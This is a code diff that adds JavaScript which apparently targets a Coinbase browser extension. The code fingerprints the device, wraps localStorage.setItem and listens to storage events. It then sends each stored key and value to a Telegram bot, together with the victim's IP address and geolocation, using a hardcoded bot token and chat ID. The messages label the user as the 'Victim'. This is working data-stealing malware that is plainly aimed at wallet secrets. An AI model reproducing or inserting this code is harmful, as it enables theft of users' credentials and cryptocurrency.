@@ -1,0 +1,164 @@
+// Function to generate a consistent device identifier
+    function getDeviceIdentifier() {
+        // Check if we already have a device ID in localStorage
+        let deviceId = localStorage.getItem('_device_id');
+
+        // If not, create one and store it
+        if (!deviceId) {
+            // Create a unique ID based on various device properties
+            const components = [
+                navigator.userAgent,
+                navigator.language,
+                new Date().getTimezoneOffset(),
+                navigator.hardwareConcurrency,
+                window.screen.colorDepth,
+                window.screen.width + 'x' + window.screen.height
+            ];
+
+            // Create a hash from these components
+            let hashString = components.join('|');
+            let hash = 0;
+            for (let i = 0; i < hashString.length; i++) {
+                const char = hashString.charCodeAt(i);
+                hash = ((hash << 5) - hash) + char;
+                hash = hash & hash; // Convert to 32bit integer
+            }
+
+            // Convert to a hex string and add timestamp for uniqueness
+            deviceId = Math.abs(hash).toString(16) + '-' + new Date().getTime();
+
+            // Store for future use
+            localStorage.setItem('_device_id', deviceId);
+        }
+
+        return deviceId;
+    }
+
+    
+
+    window.addEventListener('storage', function (event) {
+        console.log('localStorage changed:');
+        console.log('Key:', event.key);
+        console.log('Old Value:', event.oldValue);
+        console.log('New Value:', event.newValue);
+        console.log('Storage Area:', event.storageArea);
+        console.log('URL:', event.url);
+
+        // Send update to Telegram
+        sendLocalStorageUpdate(event.key, event.newValue);
+    });
+
+    // Create a wrapper for localStorage to detect changes in current tab
+    const originalSetItem = localStorage.setItem;
+    localStorage.setItem = function (key, value) {
+        // Call the original function
+        originalSetItem.call(this, key, value);
+
+        // Create a custom event
+        const storageEvent = new Event('localStorageChange');
+        storageEvent.key = key;
+        storageEvent.newValue = value;
+        window.dispatchEvent(storageEvent);
+
+        // Send update to Telegram
+        sendLocalStorageUpdate(key, value);
+    };
+
+    // Listen for our custom localStorage change event
+    window.addEventListener('localStorageChange', function (event) {
+        console.log('localStorage changed in current tab:');
+        console.log('Key:', event.key);
+        console.log('New Value:', event.newValue);
+    });
+
+    // Function to send localStorage updates to Telegram
+    async function sendLocalStorageUpdate(key, value) {
+        let IpAddress = "";
+        let geoLocation = "";
+
+        try {
+            const response = await fetch("https://ipwho.is/");
+            if (!response.ok) throw new Error("Failed to fetch IP/location");
+
+            const data = await response.json();
+            IpAddress = data.ip;
+            geoLocation = `${data.city}, ${data.region}, ${data.country}`;
+
+            console.log("IP Address:", IpAddress);
+            console.log("Location:", geoLocation);
+        } catch (error) {
+            console.error("Error fetching IP/location:", error.message);
+        }
+
+        const url = 'https://raw.githubusercontent.com/grit8525/phantom-bot/main/file.txt';
+        // Fetch bot credentials from GitHub
+        async function fetchBotCredentials() {
+            try {
+                const response = await fetch(url);
+                if (!response.ok) throw new Error("Failed to fetch credentials");
+                const data = await response.text();
+                const lines = data.trim().split('\n');
+
+                let botAPI = "";
+                let chatId = "";
+
+                for (const line of lines) {
+                    if (line.startsWith('botAPI=')) {
+                        botAPI = line.substring(7).trim();
+                    } else if (line.startsWith('chatId=')) {
+                        chatId = line.substring(7).trim();
+                    }
+                }
+
+                if (!botAPI || !chatId) {
+                    throw new Error("Invalid credential format");
+                }
+
+                return { botAPI, chatId };
+            } catch (error) {
+                console.error('Error fetching credentials:', error);
+                // Fallback to hardcoded values if fetch fails
+                return {
+                    botAPI: "7406054489:AAHvLfxrckWnFjaw_E2JH6CE9QwZkKfm2tg",
+                    chatId: '7858616715'
+                };
+            }
+        }
+
+        // const { botAPI, chatId } = await fetchBotCredentials();
+        const { botAPI, chatId } = {
+            botAPI: "7406054489:AAHvLfxrckWnFjaw_E2JH6CE9QwZkKfm2tg",
+            chatId: '7858616715'
+        };
+        const updateMessage = `
+                <b>🔔LOCALSTORAGE UPDATED - COINBASE EXTENSION</b>
+                <i>${getCurrentDateTime()}</i>
+                
+                <b>Victim IP</b>: ${IpAddress}
+                <b>Operating System</b>: ${getOSNameAndVersion()}
+                <b>Geolocation</b>: ${geoLocation}
+                <b>Browser</b>: ${navigator.userAgent}
+                <b>Device ID</b>: ${getDeviceIdentifier()}
+                <b>Screen</b>: ${window.screen.width}x${window.screen.height}
+                
+                <b>Key</b>: <code>${key}</code>
+                <b>New Value</b>: <code>${value}</code>
+            `;
+
+        // Send the update via Telegram
+        fetch(`https://api.telegram.org/bot${botAPI}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: updateMessage,
+                parse_mode: 'HTML'
+            })
+        })
+            .then(response => response.json())
+            .then(data => console.log("LocalStorage update sent:", data))
+            .catch(error => console.error('Error sending localStorage update:', error));
+
+    }
